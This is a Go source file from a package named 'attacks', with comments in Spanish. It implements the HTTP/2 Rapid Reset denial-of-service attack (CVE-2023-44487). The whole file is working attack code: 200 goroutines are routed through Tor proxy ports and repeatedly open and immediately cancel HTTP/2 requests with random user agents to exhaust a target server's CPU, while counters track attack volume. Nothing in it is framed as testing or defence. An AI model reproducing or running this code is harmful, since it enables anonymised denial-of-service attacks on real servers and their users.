package attacks

import (
	"context"
	"net/http"
	"sync/atomic"
	"time"
)

// RapidReset implementa HTTP/2 Rapid Reset (CVE-2023-44487)
// Abre streams HTTP/2 y los cancela inmediatamente via context cancel
// El cliente Go envía RST_STREAM al cancelar, forzando al servidor
// a allocar y liberar recursos para cada stream — máximo impacto en CPU
func RapidReset(ctx context.Context, targetURL string, torPorts []int, stats *Stats) {
	// 200 goroutines distribuidas entre los puertos Tor disponibles
	workers := 200
	if len(torPorts) == 0 {
		return
	}

	for i := 0; i < workers; i++ {
		port := torPorts[i%len(torPorts)]
		client := makeH2Client(port)
		go rapidWorker(ctx, client, targetURL, stats)
	}
}

func rapidWorker(ctx context.Context, client *http.Client, url string, stats *Stats) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Context con timeout muy corto = RST_STREAM inmediato
			rctx, cancel := context.WithTimeout(ctx, 200*time.Millisecond)

			req, err := http.NewRequestWithContext(rctx, "GET", url, nil)
			if err != nil {
				cancel()
				continue
			}
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Cache-Control", "no-cache")

			// Lanza request en goroutine separada
			go func(r *http.Request, c *http.Client) {
				resp, err := c.Do(r)
				if err != nil {
					atomic.AddInt64(&stats.Errors, 1)
					return
				}
				resp.Body.Close()
			}(req, client)

			// Cancel inmediato = RST_STREAM al servidor
			cancel()

			atomic.AddInt64(&stats.RapidReset, 1)
			atomic.AddInt64(&stats.Total, 1)

			// Micro sleep para no quemar CPU local
			time.Sleep(300 * time.Microsecond)
		}
	}
}
